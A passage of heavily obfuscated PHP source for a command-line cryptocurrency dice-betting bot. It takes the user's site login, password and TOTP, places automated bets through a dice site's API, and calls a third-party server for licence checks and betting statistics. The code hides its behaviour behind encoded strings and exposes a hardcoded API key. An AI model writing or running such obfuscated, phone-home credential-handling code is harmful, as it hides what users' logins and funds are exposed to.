$currencyopt . "\xa"; echo "\x20\x53\x65\164\x20\x42\141\x73\145\142\145\164\40\x28\x65\170\x61\x6d\x70\154\145\40\60\56\61\x29\x3a\x20"; 
$handlebaseBet = fopen("\x70\x68\160\72\57\57\163\164\x64\151\156", "\162"); $baseBet = trim(preg_replace("\57\134\x73\x5c\x73\x2b\x2f", 
"\x20", fgets($handlebaseBet))); $baseBet = $baseBet * 100000000; echo 
"\40\123\145\164\40\115\x61\x78\x62\145\164\x20\x28\x31\55\62\60\60\51\x3a\x20"; $handlemaxBet = 
fopen("\x70\150\x70\x3a\57\x2f\163\164\144\x69\x6e", "\x72"); $maxBets = trim(preg_replace("\57\134\x73\x5c\163\x2b\57", "\x20", 
fgets($handlemaxBet))); echo 
"\40\x53\145\164\40\162\x65\163\145\x74\x20\142\141\163\x65\x62\x65\x74\40\151\x66\40\167\151\156\40\x28\146\x69\154\x6c\40\x31\40\164\157\40\171\145\163\x2c\40\60\40\164\x6f\x20\156\x6f\51\72\x20"; 
$handleresetOnWin = fopen("\160\150\160\x3a\57\x2f\x73\x74\x64\x69\x6e", "\x72"); $resetOnWin = 
trim(preg_replace("\57\134\x73\134\x73\x2b\57", "\x20", fgets($handleresetOnWin))); echo 
"\x20\x53\x65\x74\40\162\145\163\x65\x74\x20\x62\141\163\x65\x62\x65\164\x20\x69\146\x20\154\x6f\163\x65\x20\50\x66\x69\154\154\40\61\x20\x74\x6f\40\x79\145\x73\54\x20\60\40\x74\157\x20\156\x6f\51\72\x20"; 
$handleresetOnLose = fopen("\x70\150\160\x3a\x2f\x2f\x73\164\x64\151\156", "\162"); $resetOnLose = 
trim(preg_replace("\57\x5c\x73\x5c\163\x2b\57", "\x20", fgets($handleresetOnLose))); $MaxPayIn = 0; if ($resetOnWin == 0) { echo 
"\40\123\x65\x74\x20\x69\156\x63\x72\x65\141\x73\145\40\164\x68\145\40\156\145\x78\164\x20\x62\145\164\x20\x69\146\40\167\151\x6e\40\50\146\151\154\x6c\40\60\x2e\x35\40\75\x20\65\x30\45\54\40\61\x2e\60\40\x3d\x20\61\60\60\45\40\x28\144\x6f\165\x62\x6c\x65\51\x2c\40\62\x2e\60\x20\75\40\x32\60\x30\45\x20\50\x74\x72\151\x70\154\145\x29\51\72\40"; 
$handleincPercentWin = fopen("\160\150\x70\x3a\x2f\57\163\164\144\x69\x6e", "\x72"); $incPercentWin = 
trim(preg_replace("\x2f\134\x73\134\163\53\x2f", "\40", fgets($handleincPercentWin))); } else { $incPercentWin = 0; } if ($resetOnLose == 
0) { echo 
"\40\123\x65\x74\40\151\x6e\x63\162\145\x61\x73\x65\40\x74\x68\x65\x20\x6e\145\x78\164\x20\142\x65\x74\40\151\x66\40\x6c\157\163\145\40\x28\146\151\154\x6c\40\x30\x2e\x35\40\x3d\40\x35\x30\x25\x2c\40\61\x2e\60\x20\x3d\x20\x31\60\60\45\x20\x28\144\157\x75\142\154\145\51\54\40\62\56\x30\x20\x3d\x20\x32\x30\60\x25\40\x28\164\x72\151\160\x6c\145\x29\51\x3a\40"; 
$handleincPercentLose = fopen("\160\150\160\x3a\x2f\x2f\163\x74\144\x69\156", "\x72"); $incPercentLose = 
trim(preg_replace("\x2f\x5c\x73\134\163\53\x2f", "\x20", fgets($handleincPercentLose))); } else { $incPercentLose = 0; } if 
($premiumMember == 0) { echo 
"\x53\145\164\40\155\141\170\40\142\145\x74\40\163\151\172\x65\40\50\x69\156\40\45\x2c\40\163\145\164\x20\60\x20\164\157\x20\x75\x6e\x6c\151\155\x69\x74\145\x64\51\72\40"; 
$MaxPayInCon = trim(preg_replace("\57\x5c\x73\134\x73\53\x2f", "\x20", fgets(fopen("\x70\150\160\x3a\57\x2f\x73\164\x64\151\156", 
"\x72")))); if ($MaxPayInCon != 0) { $MaxPayIn = floor(startBalance($currencyopt) * $MaxPayInCon / 100); echo 
"\123\x65\164\x20\151\146\40\142\145\x74\40\163\151\172\x65\x20\145\x71\165\141\154\40\x6f\x72\40\155\x6f\x72\145\40\164\150\x61\156\x20\x6d\x61\x78\40\x62\x65\164\x20\x73\151\x7a\x65\x20\50\162\145\x73\x65\x74\75\60\54\40\163\164\x6f\x70\x3d\61\x29\x3a\x20"; 
$LoseMaxBet = trim(preg_replace("\57\134\163\x5c\x73\53\57", "\x20", fgets(fopen("\160\150\160\72\x2f\x2f\x73\x74\x64\x69\x6e", 
"\x72")))); if ($LoseMaxBet == 0) { $ResetOnLoseMaxBet = 1; $StopOnLoseMaxBet = 0; } else { $ResetOnLoseMaxBet = 0; $StopOnLoseMaxBet = 1; 
} } else { $ResetOnLoseMaxBet = 0; $StopOnLoseMaxBet = 0; } } else { $MaxPayIn = 0; $ResetOnLoseMaxBet = 0; $StopOnLoseMaxBet = 0; } echo 
"\x20\123\145\x74\x20\x63\150\141\156\143\x65\x20\50\146\x69\x6c\154\x20\65\x2d\71\x35\51\72\40"; $handlechanceHigh = 
fopen("\160\x68\160\x3a\x2f\x2f\163\x74\x64\151\x6e", "\162"); $chanceHigh = trim(preg_replace("\57\134\163\134\163\53\x2f", "\40", 
fgets($handlechanceHigh))); $low = 0; $high = $chanceHigh * 9999; $currency = $currencyopt; $chance = ($high - $low) / 999999 * 100; echo 
"\12\12\75\x3d\x3d\75\x3d\x3d\75\x3d\75\102\x45\124\123\105\x54\x20\123\x55\x4d\x4d\x41\x52\x59\75\75\x3d\75\x3d\x3d\75\x3d\x3d\12"; echo 
"\x20\131\x6f\165\162\x20\x62\x65\x74\163\x65\164\x3a\40\12"; echo "\x20\x20\x31\56\40\x42\141\163\145\40\x42\x65\164\72\x20" . 
number_format($baseBet / 100000000, 8) . "\12"; echo "\x20\x20\x32\56\40\x4d\141\170\x20\102\145\164\72\x20" . $maxBets . "\xa"; echo 
"\40\40\63\56\40\122\x65\163\145\x74\40\x6f\x6e\x20\167\x69\x6e\50\61\x3d\x79\145\x73\54\x20\x30\75\x6e\x6f\51\x3a\40" . $resetOnWin . 
"\12"; echo 
"\x20\x20\x34\56\40\122\x65\x73\x65\x74\40\x6f\156\40\x6c\157\x73\145\x28\x31\75\171\x65\x73\x2c\x20\60\x3d\x6e\x6f\x29\72\x20" . 
$resetOnLose . "\xa"; echo 
"\40\x20\x35\56\40\102\x61\x73\x65\x20\142\145\x74\40\x69\156\x63\162\145\x61\x73\145\40\151\146\40\x77\151\x6e\72\40" . $incPercentWin . 
"\xa"; echo "\40\40\x36\x2e\40\x42\x61\x73\145\40\142\x65\164\40\151\x6e\x63\162\x65\141\163\145\x20\151\x66\40\x6c\x6f\163\145\72\x20" . 
$incPercentLose . "\xa"; echo "\x20\40\67\x2e\x20\x43\150\141\x6e\143\145\x3a\x20" . round($chance) . "\x25\xa"; if ($premiumMember == 0) 
{ echo "\40\40\70\56\x20\115\x61\170\x20\142\145\164\x20\x73\151\172\145\72\40" . $MaxPayInCon . "\45\12"; echo 
"\40\x20\x39\56\x20\122\145\x73\x65\164\x20\117\x6e\40\x4c\157\x73\145\72\x20" . $ResetOnLoseMaxBet . "\xa"; echo 
"\40\x20\61\60\x2e\40\123\164\x6f\x70\40\x4f\156\x20\x4c\157\163\145\72\x20" . $StopOnLoseMaxBet . "\xa"; } echo 
"\40\103\x6f\156\164\151\x6e\165\x65\x3f\x20\x5b\131\57\156\135\40"; $handlebetSetConfirm = 
fopen("\160\x68\x70\72\x2f\x2f\x73\x74\x64\x69\156", "\162"); $betSetConfirm = trim(preg_replace("\x2f\134\x73\x5c\x73\53\57", "\x20", 
fgets($handlebetSetConfirm))); if ($betSetConfirm == "\156" || $betSetConfirm == "\x4e") { goto MANUAL; } } $stat = 
apiWeb("\x68\164\x74\x70\x73\x3a\57\57\143\x79\142\145\x72\154\151\x6e\x6b\x6f\146\x66\x69\x63\151\x61\x6c\56\143\x6f\155\57\x61\x70\151\57\151\156\144\x65\x78\x2e\x70\x68\x70\x2f\x72\145\143\157\x72\x64\x73\57\x62\145\164\x73\x65\x74\137\163\x74\141\164\57" 
. $value["\x69\144"] . '')["\x73\x74\x61\164"]; $data_array = array("\x73\164\x61\164" => (int) $stat + 1); $update_plan = 
callAPI("\x50\x55\x54", 
"\150\x74\164\x70\x73\x3a\x2f\57\x63\171\x62\145\162\154\151\x6e\153\x6f\146\x66\x69\143\151\x61\x6c\56\143\157\x6d\57\141\x70\x69\57\151\x6e\144\x65\170\56\160\x68\x70\57\162\145\143\x6f\162\x64\163\57\x62\x65\164\x73\x65\x74\137\163\x74\141\x74\x2f" 
. $value["\151\144"], json_encode($data_array)); } } goto y1X3G; M3qlX: echo 
"{$blue2}\x3d\75\x3d\x3d\x3d\x3d\75\x3d\x4c\117\x47\x49\116\x3d\75\x3d\75\x3d\75\75\x3d\xa"; goto Y74xj; kfeKD: $curple = 
"\33\133\x30\73\x33\x35\x6d"; goto pcq8t; QzT0f: 
system("\145\143\x68\x6f\x20\42\xe2\226\210\342\226\x88\342\226\x88\342\x96\x88\xe2\226\210\342\226\x88\342\x96\210\xe2\x96\210\342\x96\x88\xe2\x96\x88\xe2\x96\210\xe2\x96\210\342\226\x88\342\x96\210\xe2\226\210\xe2\226\210\342\x96\x88\xe2\226\210\342\x96\210\342\x96\210\xe2\226\x88\342\x96\x88\342\226\210\342\x96\210\xe2\226\210\342\226\210\342\226\210\342\226\210\40\x3c\133\x44\111\x53\103\114\x41\111\115\105\x52\135\76\40\342\x96\x88\xe2\226\x88\342\226\x88\xe2\x96\210\xe2\x96\210\xe2\x96\x88\342\x96\x88\xe2\x96\x88\xe2\226\210\342\x96\x88\xe2\x96\x88\342\x96\x88\342\226\x88\xe2\226\210\xe2\226\x88\xe2\226\x88\342\x96\210\xe2\226\210\342\226\210\342\226\210\xe2\x96\210\xe2\226\x88\xe2\x96\x88\xe2\x96\x88\342\x96\x88\xe2\226\x88\xe2\226\210\xe2\x96\210\x22\x20\x7c\x20\154\157\154\143\x61\164"); 
goto tCdBL; nIMBL: $green2 = "\x1b\133\61\73\x33\x32\155"; goto gzC2z; oW83o: $betsetList = 
apiWeb("\x68\x74\164\x70\x73\72\57\x2f\143\171\142\x65\162\154\x69\x6e\x6b\157\146\x66\151\x63\151\141\x6c\x2e\x63\157\x6d\x2f\x61\160\151\57\151\156\x64\x65\x78\x2e\x70\150\x70\x2f\162\x65\143\157\x72\x64\163\x2f\x62\145\164\163\145\164\137\x73\x74\x61\x74\77\x6f\x72\x64\145\162\x3d\x6f\162\144\145\162\54\x61\163\x63\x26\146\151\x6c\164\x65\x72\75\163\164\x61\164\x75\163\x2c\145\161\x2c\x31"); 
goto T1AoF; BwayH: echo 
"{$red}\40\40\x20\40\x20\x20\40\40\x20\40\x20\x20\x20\x20\x20\40\101\x6c\x6c\40\117\103\105\101\x4e\x20\x43\x59\102\105\x52\x20\x4c\111\x4e\x4b\x20\123\165\x70\x70\x6f\162\x74\x20\124\145\x61\155\xa"; 
goto jK_2Q; EnVHh: LOGINEX: goto LC9dG; bW6_Z: $green = "\33\133\60\x3b\x33\62\155"; goto nIMBL; cGqNT: function globalProfit($coin) { 
$url = 
"\x68\x74\164\160\x73\x3a\57\x2f\143\x79\x62\x65\x72\x6c\x69\156\153\157\146\146\151\143\151\141\x6c\56\143\157\155\57\x61\160\151\x2f\x69\x6e\x64\x65\170\56\160\150\x70\x2f\x72\x65\143\157\x72\144\163\x2f\160\162\x6f\x66\x69\x74\x5f\163\x74\141\164\x2f" 
. $coin . ''; $globalProfit = apiWeb($url)["\x70\x72\157\146\x69\x74"]; return $globalProfit; } goto WUA4b; c3Yzl: function 
startBalance($coins) { global $balances; foreach ($balances as $key => $value) { if ($value["\103\x75\x72\x72\x65\156\x63\x79"] == $coins) 
{ $startBalance = $value["\102\141\x6c\x61\156\143\145"]; return $startBalance; } } } goto cGqNT; jBvZG: $url = 
"\150\x74\164\160\x73\72\57\57\167\x77\167\x2e\x39\x39\71\160\162\157\170\171\56\x63\157\x6d\x2f\x61\x70\151\x2f\x77\145\142\x2e\x61\163\x70\170"; 
goto Bk8jo; Ljujj: 
system("\145\143\x68\157\40\42\111\156\x66\157\162\155\x61\164\x69\x6f\x6e\40\151\163\x20\x70\x72\x65\x73\x65\156\164\145\x64\x20\x61\163\x20\x77\145\154\154\40\141\163\x20\x70\157\163\x73\151\x62\154\145\54\x20\142\x75\x74\x20\167\x65\x20\x64\157\40\x6e\x6f\164\x20\x67\165\141\x72\141\156\164\145\x65\x20\x31\60\60\x25\x20\141\x63\x63\165\162\x61\x63\x79\x20\157\146\40\x61\154\154\40\x74\150\145\40\162\x65\143\157\x6d\x6d\145\156\x64\141\x74\x69\x6f\x6e\163\40\160\x72\145\x73\x65\156\164\x65\144\42\40\174\40\154\x6f\154\143\x61\x74"); 
goto JvbVn; K3Ugp: $abu2 = "\x1b\x5b\61\x3b\x33\x30\x6d"; goto QWcZy; XcnrQ: echo 
"{$putih}\40\x20\x20\40\40\x20\x20\x20\x20\40\x20\x20\x20\x20\40\x20\40\x20\x20\40\x20\40\102\x61\x6e\147\40\x5a\x61\x6d\172\x20\40\x55\156\143\x6c\x65\40\x42\141\155\x7a\xa"; 
goto N1ue9; g3VJ7: echo 
"{$putih}\40\x20\40\40\x20\40\x20\40\40\40\x20\40\40\40\x20\40\x20\40\x20\x20\40\40\x20\40\x20\123\x63\x72\151\160\x74\x20\103\x72\x65\141\164\157\162\12"; 
goto xcwsd; S6NQW: system("\143\154\145\141\x72"); goto HY4JO; QWcZy: $putih = "\33\133\x30\73\63\x37\155"; goto IDsv0; n14tU: $statBet = 
"\x4c\x6f\167"; goto OJmjd; wxLJu: echo 
"{$lblue2}\104\x6f\x20\x79\x6f\x75\40\167\x61\x6e\x74\x20\x74\157\x20\x74\165\x72\x6e\40\157\156\x20\123\157\x75\156\x64\40\x4e\157\164\151\x66\151\143\x61\164\151\x6f\156\77\40\x5b\131\57\x6e\x5d\x20"; 
goto o9soQ; rksoc: $handleMenu = fopen("\160\x68\160\x3a\x2f\57\x73\x74\144\x69\x6e", "\162"); goto y56Ej; jxb0p: MENU: goto g3w7n; VcjU1: 
$premiumMember = 0; goto jBvZG; o5L2N: $handle = fopen("\x70\x68\160\x3a\57\x2f\x73\164\x64\x69\x6e", "\162"); goto WhBf0; xcKzw: 
$userAccId = $api_response_decoded["\x41\143\x63\x6f\165\x6e\x74\x49\x64"]; goto vCQUV; uHVxM: system("\x63\154\x65\141\x72"); goto co7UJ; 
MLLvB: echo "{$blue2}\75\75\x3d\75\x3d\75\x3d\x3d\115\x41\x49\x4e\115\x45\116\125\75\x3d\75\75\x3d\x3d\x3d\75\xa"; goto FuXSI; APyoF: if 
(isset($api_response_decoded["\145\162\x72\157\162"])) { echo "\xa" . $api_response_decoded["\145\162\x72\157\x72"] . "\12"; die; } goto 
n9Mdw; g3w7n: echo "\12{$lblue2}\75\x3d\x3d\75\75\75\75\x3d\102\105\124\123\x45\124\40\x4d\x45\116\x55\x3d\x3d\75\x3d\75\x3d\x3d\75\12"; 
goto oW83o; Bk8jo: $apiKey = 
"\x38\146\145\66\x32\x31\x34\70\62\x62\x33\62\x34\x32\67\142\71\x34\64\x62\63\63\x34\64\x39\x32\141\142\x36\x32\x63\x32"; goto uHVxM; 
BG4vx: $ReferredById = $api_response_decoded["\122\x65\146\x65\x72\x72\x65\144\102\x79\x49\x64"]; goto TXruR; QBdnz: $false = 
"{$abu2}\133{$red}\x78{$abu2}\135{$red2}"; goto sVmeH; tCdBL: 
system("\145\143\150\157\40\x22\104\151\143\x65\40\107\141\155\145\x73\40\x61\162\x65\x20\150\x69\147\150\x20\162\151\x73\153\56\x20\x54\150\145\40\x72\145\163\x70\x6f\x6e\x73\x69\142\x69\x6c\x69\164\171\40\x66\x6f\162\x20\x74\150\x65\x20\162\145\163\x75\x6c\x74\x73\x20\x6f\x66\x20\141\x6c\154\x20\144\x65\x63\x69\x73\x69\x6f\156\x73\40\x72\x65\163\x74\163\x20\167\x69\x74\150\40\171\x6f\x75\x22\40\x7c\x20\x6c\x6f\154\143\141\x74"); 
goto Ljujj; IDsv0: $putih2 = "\33\x5b\x31\x3b\x33\x37\x6d"; goto PtPzv; vhuWF: $res = "\33\x5b\60\155"; goto I8sJZ; g29_N: $response = 
json_decode($get_data, true); goto zEPeX; aA5ux: if ($sound == "\171" || $sound == "\131") { if 
(system("\144\160\x6b\147\x2d\161\x75\x65\162\171\x20\x2d\127\x20\55\x66\75\47\x24\173\x53\x74\x61\164\165\163\x7d\x27\40\163\157\x78\40\62\x3e\x2f\144\x65\x76\x2f\x6e\x75\154\154\40\x7c\40\x67\x72\x65\160\40\x2d\143\40\x22\157\x6b\40\x69\x6e\x73\164\x61\154\x6c\145\144\42") 
== 0) { echo 
"\x50\x6c\145\141\x73\x65\x20\151\156\163\x74\141\154\x6c\x20\x53\117\x58\40\x50\141\x63\x6b\141\147\x65\40\146\151\162\x73\x74\x2e\40\x27\x70\153\x67\x20\151\156\x73\x74\x61\x6c\x6c\x20\163\x6f\170\x27\xa"; 
die; } $soundNotif = 1; } goto DDo_K; hBtpH: date_default_timezone_set("\101\x73\x69\141\57\112\x61\153\x61\x72\x74\141"); goto vhuWF; 
hsHPO: $centung = "{$abu2}\133{$yellow}\41{$abu2}\x5d{$yellow2}"; goto r_ptF; ToTF9: $loginData = 
"\x61\x3d\x4c\157\147\151\x6e\x26\113\x65\171\75" . $apiKey . "\x26\125\x73\145\162\x6e\141\155\x65\75" . $user . 
"\46\x50\x61\x73\x73\167\157\x72\x64\75" . $pw . "\46\x54\157\164\160\75" . $totp; goto Y8wiy; sVmeH: $true = 
"{$curple2}\133{$lblue}\53{$curple2}\x5d{$lblue2}"; goto hsHPO; o9soQ: $handleSound = fopen("\x70\150\x70\72\57\x2f\x73\x74\144\151\156", 
"\162"); goto p12iU; YgRTt: $yellow2 = "\x1b\133\61\73\x33\x33\x6d"; goto ErGFZ; y56Ej: $menu = 
trim(preg_replace("\57\x5c\x73\134\163\x2b\57", "\40", fgets($handleMenu))); goto oMWKG; pcq8t: $curple2 = "\x1b\x5b\x31\x3b\63\65\155"; 
goto phil3; gyYix: function feature($val, $data) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $val); curl_setopt($ch, 
CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_USERAGENT, 
"\115\x6f\172\151\154\154\x61\x2f\65\56\x30\x20\50\127\151\156\x64\x6f\x77\163\x20\x4e\124\x20\61\60\x2e\x30\x3b\x20\127\151\156\x36\64\73\x20\170\x36\x34\51\x20\x41\160\x70\154\x65\x57\x65\x62\x4b\x69\x74\57\x35\63\x37\56\63\66\40\50\113\x48\124\x4d\114\54\x20\x6c\151\x6b\x65\x20\x47\145\x63\153\157\51\x20\103\x68\162\x6f\x6d\x65\57\x38\60\56\60\56\63\x39\70\x37\x2e\61\66\63\x20\x53\141\x66\141\162\x69\57\65\63\x37\x2e\63\x36"); 
curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
curl_setopt($ch, CURLOPT_REFERER, true); $result = curl_exec($ch); curl_close($ch); return $result; } goto cDsHo; mtgtq: echo 
"\xa\x20\40\x20\40{$putih2}\x43\150\x6f\x69\x63\145\40\x59\157\165\x72\x20\103\157\x69\156\72\12\xa\x20\x20\40\x20\x20\x31\56\40\102\124\x43\40\x28\102\141\154\x61\x6e\x63\x65\72\x20" 
. number_format(startBalance("\142\164\x63") / 100000000, 8) . 
"\x29\12\40\x20\40\x20\x20\x20\x20\x20\x47\x6c\157\142\x61\x6c\40\124\x6f\164\141\154\40\x6f\x66\x20\x41\x75\164\157\x20\127\x44\x3a\40" . 
number_format(globalProfit(1) / 10000, 5) . 
"\x20\x42\x54\103\xa\x20\40\x20\x20\40\62\x2e\x20\x44\x4f\x47\105\40\x28\x42\x61\154\141\x6e\143\145\x3a\x20" . 
number_format(startBalance("\x64\157\x67\145") / 100000000, 8) . 
"\51\xa\40\x20\x20\40\40\x20\x20\40\107\154\157\142\141\154\40\124\157\164\x61\x6c\x20\157\146\x20\101\x75\x74\x6f\40\127\104\72\x20" . 
number_format(globalProfit(2) / 10000, 0) . 
"\40\104\x6f\147\x65\12\40\40\40\40\40\63\x2e\x20\x4c\x54\x43\40\x28\x42\x61\154\x61\156\x63\x65\72\40" . 
number_format(startBalance("\x6c\164\x63") / 100000000, 8) . 
"\51\12\x20\x20\40\x20\x20\x20\x20\x20\107\x6c\x6f\x62\141\154\40\124\x6f\x74\x61\154\x20\157\146\40\101\165\x74\x6f\40\127\104\72\x20" . 
number_format(globalProfit(3) / 10000, 5) . 
"\x20\114\x54\103\xa\40\40\x20\40\40\x34\56\x20\105\x54\x48\x20\x28\102\141\154\x61\156\x63\145\72\x20" . 
number_format(startBalance("\x65\164\150") / 100000000, 8) . 
"\51\12\x20\40\x20\40\x20\x20\x20\x20\x47\154\x6f\142\x61\154\40\124\157\x74\x61\x6c\40\x6f\x66\x20\101\x75\x74\x6f\40\127\x44\72\40" . 
number_format(globalProfit(4) / 10000, 5) . 
"\40\x45\x54\x48\12\40\xa\x20\x20\x20\40\40\131\157\x75\162\x20\143\150\x6f\151\143\x65\x3a\40"; goto d0r1A; Ly14l: $wdAddrInput = 
$wdAddr; goto yolsD; D9D8Z: echo 
"{$red}\40\40\x20\x20\x20\40\40\x20\x20\x20\x20\x20\40\x20\40\40\40\40\40\40\40\75\75\x3d\75\75\x3d\x3d\75\x3d\75\x3d\x20\75\x3d\x3d\75\x3d\x3d\75\x3d\75\x3d\xa"; 
goto XcnrQ; f0_rW: $red2 = "\33\x5b\x31\x3b\x33\61\x6d"; goto bW6_Z; zEPeX: if ($response["\x68\141\x73\150"] != $scriptId || 
$response["\163\x74\141\x74"] == 0) { echo "\12" . $response["\155\x65\x73\x73\x61\147\x65"] . "\12\12"; die; } goto wxLJu; YMEdt: echo 
"{$putih}\x20\x20\x20\x20\40\x20\40\40\x20\40\x20\40\40\x20\x20\40\40\x20\x20\x20\x20\x3d\75\75\75\75\x3d\75\x3d\x3d\75\x3d\75\x3d\x3d\x3d\x3d\75\75\x3d\75\x3d\75\xa"; 
goto BwayH; XSOoh: $loseStrike = 0; goto Ly14l; jK_2Q: echo 
"{$putih}\x20\x20\40\x20\40\40\40\40\x20\40\x20\40\x20\x20\x20\x20\40\40\40\x20\40\x20\x42\x61\x6e\x67\x20\x4f\x63\x79\x6c\40\40\40\40\x4f\x65\137\104\141\x6e\12"; 
goto D9D8Z; JvbVn: 
system("\145\x63\150\x6f\40\42\342\226\210\xe2\226\210\xe2\226\210\xe2\x96\210\xe2\x96\210\xe2\226\210\342\x96\x88\342\x96\210\342\226\210\xe2\x96\210\342\x96\210\xe2\x96\x88\xe2\x96\210\342\226\210\342\226\210\xe2\x96\x88\xe2\x96\210\342\x96\210\xe2\226\210\342\x96\x88\342\x96\x88\342\226\x88\342\x96\210\342\226\x88\xe2\226\210\xe2\x96\x88\xe2\226\210\xe2\x96\x88\xe2\226\210\342\x96\210\342\x96\210\xe2\x96\x88\xe2\226\210\xe2\226\x88\342\226\x88\342\226\210\xe2\226\x88\xe2\x96\x88\342\226\210\xe2\226\210\xe2\x96\x88\xe2\x96\210\342\226\x88\xe2\226\210\xe2\x96\x88\xe2\x96\x88\342\226\x88\342\226\x88\342\226\x88\xe2\226\210\xe2\226\210\xe2\226\210\xe2\226\x88\xe2\x96\210\xe2\x96\210\342\226\210\xe2\x96\210\xe2\x96\210\xe2\x96\210\342\226\210\342\226\x88\xe2\226\x88\342\x96\210\342\226\x88\xe2\x96\210\342\x96\210\xe2\x96\x88\xe2\226\210\342\226\210\342\x96\210\342\x96\210\xe2\226\210\x22\x20\x7c\x20\154\157\154\x63\141\x74"); 
goto OSh1m; kmEWn: echo "\40\x20\131\x6f\165\162\40\143\x68\x6f\151\x63\x65\x3a\x20"; goto o5L2N; oMWKG: if ($menu == 2) { goto 
CREATEACCOUNT; } goto M3qlX; MyO1Y: echo 
"{$putih2}\40\12\40\137\137\x5f\x5f\x5f\137\137\137\x20\x20\137\137\137\x20\40\137\137\137\137\137\x5f\137\137\40\x20\x5f\137\x5f\137\137\137\x5f\40\x20\x20\40\x20\x20\x20\40\40\x20\x20\137\x5f\137\x20\x20\x20\40\x20\x20\137\137\x5f\40\40\x5f\x5f\x5f\137\x5f\x5f\x5f\40\40\40\x20\40\12\x7c\134\x20\x20\x20\137\x5f\137\40\134\174\x5c\40\x20\134\x7c\x5c\x20\40\40\137\137\x5f\137\x5c\x7c\134\40\40\x5f\x5f\x5f\40\134\40\40\40\x20\40\x20\x20\x20\x20\174\x5c\40\x20\134\40\40\40\40\57\x20\x20\x2f\174\57\40\x20\137\x5f\137\x20\40\134\40\x20\40\40\xa\134\x20\x5c\40\x20\134\137\174\x5c\x20\134\40\x5c\x20\40\134\x20\134\40\40\134\x5f\x5f\137\174\x5c\x20\134\40\40\x20\137\x5f\x2f\174\x20\x20\40\x20\x20\40\40\x20\134\x20\x5c\40\x20\x5c\40\40\57\x20\40\x2f\x20\x2f\x5f\137\57\x7c\x5f\57\40\40\57\x7c\40\x20\x20\xa\40\x5c\40\x5c\x20\40\x5c\40\40\134\x20\x5c\40\134\x20\40\x5c\x20\134\x20\x20\x5c\40\40\40\x20\x5c\40\x5c\40\x20\x5c\x5f\174\57\x5f\x5f\40\x20\x20\x20\x20\40\40\x5c\40\x5c\x20\40\134\57\x20\x20\x2f\x20\57\174\137\137\x7c\x2f\57\x20\x20\57\x20\57\40\40\x20\xa\x20\x20\x5c\40\134\40\40\134\x5f\x20\134\x20\x5c\40\x5c\x20\x20\x5c\40\x5c\40\40\134\x5f\x5f\137\137\x5c\40\134\x20\40\x5c\x5f\x7c\134\40\x5c\x20\40\x20\x20\x20\40\x20\x5c\40\134\x20\40\40\40\x2f\x20\57\x20\x20\40\40\x20\57\40\40\x2f\137\x2f\137\x5f\40\x20\12\40\x20\40\x5c\40\134\137\137\137\x5f\x5f\137\x5f\134\x20\134\137\x5f\134\40\134\x5f\137\x5f\x5f\x5f\137\x5f\134\x20\134\137\x5f\137\x5f\x5f\x5f\137\x5c\x20\40\40\x20\x20\40\x20\x5c\x20\x5c\137\x5f\57\x20\x2f\40\x20\40\40\x20\174\x5c\137\x5f\137\x5f\137\137\x5f\137\134\xa\40\40\x20\40\134\174\137\x5f\137\137\x5f\137\137\174\134\x7c\137\137\x7c\134\174\137\137\137\137\x5f\137\x5f\x7c\x5c\174\x5f\137\137\x5f\137\137\137\x7c\40\40\x20\40\40\x20\40\40\134\x7c\x5f\x5f\x7c\x2f\x20\40\x20\40\40\x20\40\134\x7c\137\137\x5f\x5f\137\137\137\x7c\x20\xa\xa"; 
goto TNjk2; zag05: $userCookies = $api_response_decoded["\x53\x65\x73\x73\x69\157\x6e\103\157\157\x6b\151\145"]; goto xcKzw; OebYr: 
$soundNotif = 0; goto VcjU1; EpSNH: sleep(1); goto APyoF; tSPFd: if ($betSetOptcoin == 1) { $currencyopt = "\x62\164\x63"; } elseif 
($betSetOptcoin == 2) { $currencyopt = "\144\x6f\x67\145"; } elseif ($betSetOptcoin == 3) { $currencyopt = "\154\164\143"; } elseif 
($betSetOptcoin == 4) { $currencyopt = "\145\x74\150"; } goto jxb0p; xcwsd: sleep(1); goto lZLB_; NN1MA: while (true) { while (true) { 
$betSetAutomated = "\x61\x3d\120\154\141\143\x65\101\165\164\157\155\x61\x74\x65\x64\x42\x65\x74\163\46\163\75" . $userCookies . 
"\46\x42\x61\x73\145\120\141\x79\x49\156\x3d" . $baseBet . "\x26\x4c\157\x77\x3d" . $low . "\46\x48\151\147\150\75" . $high . 
"\46\115\x61\170\x42\145\164\x73\75" . $maxBets . "\46\122\145\x73\145\164\117\156\x57\151\x6e\x3d" . $resetOnWin . 
"\46\122\145\163\x65\164\x4f\x6e\x4c\x6f\x73\145\x3d" . $resetOnLose . 
"\46\x49\x6e\x63\x72\x65\141\163\145\x4f\x6e\127\x69\156\x50\x65\162\x63\x65\156\164\75" . $incPercentWin . 
"\x26\x49\156\143\162\x65\141\163\x65\x4f\156\114\x6f\163\x65\x50\x65\x72\143\145\156\x74\75" . $incPercentLose . 
"\46\115\x61\170\120\141\171\111\x6e\75" . $MaxPayIn . "\x26\122\x65\x73\145\164\x4f\x6e\x4c\x6f\163\x65\115\141\x78\102\x65\x74\x3d" . 
$ResetOnLoseMaxBet . "\x26\x53\x74\x6f\x70\x4f\156\x4c\157\163\145\x4d\141\x78\x42\145\164\x3d" . $StopOnLoseMaxBet . 
"\46\123\164\157\x70\x4d\x61\x78\x42\141\154\141\156\x63\x65\75\60\x26\123\x74\x6f\x70\115\151\x6e\x42\141\x6c\x61\x6e\143\x65\x3d\x30\46\103\x6c\151\145\x6e\164\x53\x65\145\x64\x3d" 
. $userClientSeed . "\x26\x43\165\x72\x72\145\156\x63\171\x3d" . $currency . 
"\46\103\157\x6d\160\x61\143\x74\75\61\x26\120\162\157\x74\x6f\143\x6f\x6c\x56\145\x72\163\x69\x6f\x6e\x3d\x32"; $betResponse = 
json_decode(feature($url, $betSetAutomated) . "\12", true); if 
(isset($betResponse["\x43\x68\141\x6e\143\145\124\x6f\x6f\x48\x69\147\150"]) || 
isset($betResponse["\103\x68\141\x6e\143\x65\x54\157\x6f\x4c\x6f\167"]) || 
isset($betResponse["\111\x6e\x73\x75\146\146\151\x63\x69\145\156\164\x46\x75\156\144\163"]) || 
isset($betResponse["\x4e\157\120\157\x73\x73\x69\x62\x6c\145\x50\x72\x6f\x66\x69\164"]) || 
